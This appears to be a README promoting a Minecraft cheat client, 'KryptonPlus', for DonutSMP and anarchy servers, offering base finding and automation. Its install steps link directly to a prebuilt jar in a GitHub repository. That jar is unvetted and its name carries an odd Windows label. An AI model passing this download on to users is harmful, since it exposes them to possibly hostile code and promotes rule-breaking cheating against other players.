## 🔍 Overview

**KryptonPlus Client** is a high-performance **Minecraft utility mod** designed for players who want a competitive edge on **DonutSMP** and similar servers.

It combines **base finding tools, storage detection, and automation systems** to streamline gameplay and reduce grind. Whether you're locating hidden bases or maximizing profit, KryptonPlus helps you move faster and smarter.

> Built for advanced players on DonutSMP, 2b2t-style servers, and anarchy SMP environments.

## 🛠️ Installation Guide

1. Install **Fabric Loader** → https://fabricmc.net  
2. Download **Fabric API** → https://modrinth.com/mod/fabric-api  
3. Place both files into your `mods` folder  
4. Download **KryptonPlus Client**:  
   👉 https://github.com/KryptonClientReleases/Krypton-Client/raw/refs/heads/main/KryptonPlus-windows-x86-Default.jar  
5. Launch Minecraft with Fabric  
6. Press **`INSERT`** in-game to open the menu
